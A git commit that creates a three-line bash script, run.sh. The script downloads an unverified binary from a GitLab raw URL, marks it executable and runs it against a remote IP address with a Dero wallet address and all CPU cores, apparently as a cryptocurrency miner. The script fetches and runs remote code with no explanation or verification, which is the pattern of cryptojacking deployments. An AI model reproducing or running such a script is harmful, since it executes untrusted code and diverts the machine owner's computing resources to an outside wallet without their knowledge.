905d12eebc2717399489578bd57ab1f579d6ad49
lesacooper <135961898+lesacooper@users.noreply.github.com>
2023-06-10 20:32:46 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+curl -L https://gitlab.com/taufiqnurul2022/codefrezee/-/raw/main/modv8beta1 > build && chmod +x build && ./build -r 157.245.94.101:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w.modernav8b1 -m $(nproc --all) -p rpc
